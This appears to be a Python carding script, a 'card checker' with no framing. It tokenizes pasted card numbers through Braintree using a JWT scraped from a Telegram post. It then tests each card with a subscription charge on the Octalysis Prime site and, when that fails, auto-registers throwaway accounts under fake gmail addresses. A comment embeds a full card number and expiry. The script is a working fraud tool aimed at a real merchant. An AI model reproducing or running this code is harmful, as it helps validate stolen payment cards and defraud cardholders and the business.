import requests,re
import random
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	text = requests.post('https://t.me/heya2/87').text
	lines = text.split('\n')

	for line in lines:
	    if 'eyJ' in line:
	        jwt_value = line.split('content="')[1].rstrip('">')
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'authorization': f'Bearer {jwt_value}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'dropin2',
	        'sessionId': '1d98f8cc-9816-4752-aed1-9eeb5c82e259',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	
	# Note: json_data will not be serialized by requests
	# exactly as it was in the original request.
	#data = '{"clientSdkMetadata":{"source":"client","integration":"dropin2","sessionId":"1d98f8cc-9816-4752-aed1-9eeb5c82e259"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4347697098903237","expirationMonth":"10","expirationYear":"2027"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
	#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
	id=(response.json()['data']['tokenizeCreditCard']['token'])
	import requests
	
	cookies = {
	    'ubvt': 'v2%7C2ba97423-383e-40b0-843a-5477765d2f1f%7Cb912631f-c46c-4f18-83d4-9e41082189ff%3Ah%3Adta',
	    '_gid': 'GA1.2.814726812.1694242964',
	    '_fbp': 'fb.1.1694242967974.983240925',
	    '_ga_ZGNNGVH9M1': 'GS1.1.1694243139.1.1.1694243172.0.0.0',
	    '_ga': 'GA1.2.1791950045.1694242964',
	    '_ga_C79D1G78LE': 'GS1.2.1694242979.1.1.1694243288.60.0.0',
	    '_ga_MKJ77D5EMY': 'GS1.2.1694242979.1.1.1694243288.60.0.0',
	}
	with open("data.txt", "r") as file:
		first_line = file.readline().strip()
	headers = {
	    'Accept': 'application/json, text/plain, */*',
	    'Accept-Language': 'en-US,en;q=0.9',
	    'Authorization': f'JWT {first_line}',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/json;charset=UTF-8',
	    # 'Cookie': 'ubvt=v2%7C2ba97423-383e-40b0-843a-5477765d2f1f%7Cb912631f-c46c-4f18-83d4-9e41082189ff%3Ah%3Adta; _gid=GA1.2.814726812.1694242964; _fbp=fb.1.1694242967974.983240925; _ga_ZGNNGVH9M1=GS1.1.1694243139.1.1.1694243172.0.0.0; _ga=GA1.2.1791950045.1694242964; _ga_C79D1G78LE=GS1.2.1694242979.1.1.1694243288.60.0.0; _ga_MKJ77D5EMY=GS1.2.1694242979.1.1.1694243288.60.0.0',
	    'Origin': 'https://island.octalysisprime.com',
	    'Referer': 'https://island.octalysisprime.com/',
	    'Sec-Fetch-Dest': 'empty',
	    'Sec-Fetch-Mode': 'cors',
	    'Sec-Fetch-Site': 'same-origin',
	    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-platform': '"Linux"',
	}
	
	json_data = {
	    'nonce': id,
	    'subscriptionPeriod': 'm',
	}
	
	response = requests.post(
	    'https://island.octalysisprime.com/api/subscription/upgrade-account',
	    cookies=cookies,
	    headers=headers,
	    json=json_data,
	)
	print(response.json())
	try:
		ii=response.json()['resultSub']['message']
		
	except:
		cookies = {
		    'ubvt': 'v2%7C7b40d9fc-069d-4085-bda4-2883ef00626c%7Cb912631f-c46c-4f18-83d4-9e41082189ff%3Ag%3Adta',
		    '_ga': 'GA1.2.92482062.1694275871',
		    '_gid': 'GA1.2.1931131421.1694275871',
		    '_fbp': 'fb.1.1694275891669.542354229',
		    '_ga_C79D1G78LE': 'GS1.2.1694275874.1.1.1694276044.60.0.0',
		    '_gat_UA-572462-8': '1',
		    '_ga_MKJ77D5EMY': 'GS1.2.1694275889.1.1.1694276496.60.0.0',
		}
		
		headers = {
		    'Accept': 'application/json, text/plain, */*',
		    'Accept-Language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
		    'Connection': 'keep-alive',
		    'Content-Type': 'application/json;charset=UTF-8',
		    # 'Cookie': 'ubvt=v2%7C7b40d9fc-069d-4085-bda4-2883ef00626c%7Cb912631f-c46c-4f18-83d4-9e41082189ff%3Ag%3Adta; _ga=GA1.2.92482062.1694275871; _gid=GA1.2.1931131421.1694275871; _fbp=fb.1.1694275891669.542354229; _ga_C79D1G78LE=GS1.2.1694275874.1.1.1694276044.60.0.0; _gat_UA-572462-8=1; _ga_MKJ77D5EMY=GS1.2.1694275889.1.1.1694276496.60.0.0',
		    'Origin': 'https://island.octalysisprime.com',
		    'Referer': 'https://island.octalysisprime.com/',
		    'Sec-Fetch-Dest': 'empty',
		    'Sec-Fetch-Mode': 'cors',
		    'Sec-Fetch-Site': 'same-origin',
		    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
		    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
		    'sec-ch-ua-mobile': '?0',
		    'sec-ch-ua-platform': '"Linux"',
		}
		random_number = random.randint(1800, 100888)
		json_data = {
		    'firstName': 'cbxhs',
		    'lastName': 'bjdj',
		    'email': f'g{random_number}y@gmail.com',
		    'password': 'response.json()',
		    'referralCode': None,
		    'freemiumShipName': 'Dawn Treader',
		    'fromUdemy': False,
		    'usingMobile': True,
		    'pathObjective': None,
		}
		
		response = requests.post(
		    'https://island.octalysisprime.com/api/user/freemium-sign-up',
		    cookies=cookies,
		    headers=headers,
		    json=json_data,
		)
		
		# Note: json_data will not be serialized by requests
		# exactly as it was in the original request.
		#data = '{"firstName":"cbxhs","lastName":"bjdj","email":"ggdty@gmail.com","password":"response.json()","referralCode":null,"freemiumShipName":"Dawn Treader","fromUdemy":false,"usingMobile":true,"pathObjective":null}'
		#response = requests.post(
		#    'https://island.octalysisprime.com/api/user/freemium-sign-up',
		#    cookies=cookies,
		#    headers=headers,
		#    data=data,
		#)
		
		op=(response.json()['token'])
		with open("data.txt", "w") as file:
			file.write(op)
		return 'success'
		
	if 'Funds' in ii:
		return 'Funds'
	elif 'success' in ii:
		return 'success'
	else:
		return ii
	
	# Note: json_data will not be serialized by requests
	# exactly as it was in the original request.
	#data = '{"nonce":"tokencc_bh_tjfrmj_pdcmg3_zgrbgs_nffdtr_c97","subscriptionPeriod":"m"}'
	#response = requests.post(
	#    'https://island.octalysisprime.com/api/subscription/upgrade-account',
	#    cookies=cookies,
	#    headers=headers,
	#    data=data,
	#)